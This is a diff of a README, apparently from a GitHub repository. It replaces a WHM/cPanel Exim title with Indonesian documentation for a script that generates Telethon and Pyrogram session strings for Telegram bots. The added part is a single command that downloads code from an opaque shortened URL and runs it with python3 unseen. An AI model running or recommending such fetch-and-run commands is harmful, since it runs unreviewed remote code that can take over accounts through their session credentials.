@@ -1,2 +1,5 @@
-# auto-script-smtp-external-whm
-WHM/cPanel Auto Script Installed Exim! SMTP External.
+## Documentation
+Sciprt ini adalah Script untuk mendapatkan String Session Telethon dan Pyrogram di BOT Telegram.
+```shell script
+wget -O string.py https://s.id/1X6pH && python3 string.py
+```
